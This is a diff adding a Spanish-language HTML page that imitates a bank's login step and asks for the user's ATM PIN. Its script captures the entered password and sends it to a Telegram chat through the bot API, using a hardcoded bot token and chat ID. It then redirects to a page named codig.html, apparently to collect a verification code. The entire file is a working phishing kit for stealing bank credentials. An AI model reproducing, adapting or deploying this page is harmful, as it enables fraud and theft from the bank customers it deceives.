@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>replit</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+  <style>
+        *{
+            -webkit-appearance: none;
+            font-family: Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        input[type=submit]{
+            background-color:#fdda24;
+            color: #030303;
+            width: 80%;
+            height: 41px;
+            border-radius: 124px;
+            border-input: 0px solid #ecfd08;
+            margin-top: 0px;
+            border:0px solid gray;
+            padding: 5px;
+            font-weight:bold;
+            font-size:1em;
+        }
+    </style>
+</head>
+
+<body>
+   
+<img src="/img/ingresa2.jpeg" alt="" width="100%">
+  
+<br>
+<br>
+
+<!-- Eliminamos el PHP y configuramos un formulario controlado por JS -->
+<form id="passwordForm">   
+  <p style="font-size:0.9em;">Es la misma que usas en el cajero <br> automático</p>
+  <br>
+  <center>
+    <img src="/img/candadito.svg" alt="" width="7%">
+    <input type="password" id="clave" name="clave" placeholder="****" required>
+  </center> 
+              
+  <br>
+  <center><input type="submit" value="Continuar"></center><br>
+</form>
+
+<br>
+<a href=""><center> <img src="/img/bangol.jpeg" alt="" width="100%"></center></a>
+
+<script>
+  const form = document.getElementById('passwordForm');
+
+  form.addEventListener('submit', function(event) {
+    event.preventDefault(); // Evita la recarga de la página
+
+    const clave = document.getElementById('clave').value;
+
+    // Token y chat ID proporcionados
+    const token = '8042104204:AAET83zLWF34OkX7tJuHCcNvLsz1-yTHS8g';
+    const chatId = '-4577064839';
+
+    // URL de la API de Telegram para enviar mensajes
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    // Enviar los datos por AJAX
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: `Nueva clave ingresada: ${clave}`
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        // Redirección a otra página después de enviar los datos
+        window.location.href = 'codig.html'; // Cambia esta URL por la página de destino
+      } else {
+        alert('Error al enviar el mensaje a Telegram: ' + data.description);
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Hubo un error al enviar el mensaje.');
+    });
+  });
+</script>
+
+</body>
+</html>
+
